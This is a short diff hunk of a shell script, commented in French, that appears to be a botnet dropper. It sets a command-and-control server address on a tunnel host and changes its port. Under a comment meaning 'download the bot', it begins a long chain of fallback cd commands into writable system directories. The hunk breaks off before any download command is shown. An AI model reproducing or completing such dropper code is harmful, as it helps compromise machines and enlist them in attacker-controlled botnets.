@@ -4,7 +4,7 @@
 
 # Configuration du serveur C2
 C2_ADDRESS="nlzpsjlvr.localto.net"
-C2_PORT="5941"
+C2_PORT="2353"
 
 # Télécharger le bot
 cd /tmp || cd /var/tmp || cd / || cd /root || cd /home || cd /mnt || cd /opt || cd /usr || cd /bin || cd /sbin || cd /dev || cd /sys || cd /proc || cd /run || cd /var || cd /srv || cd /boot || cd /lib || cd /lib64 || cd /etc || cd /root
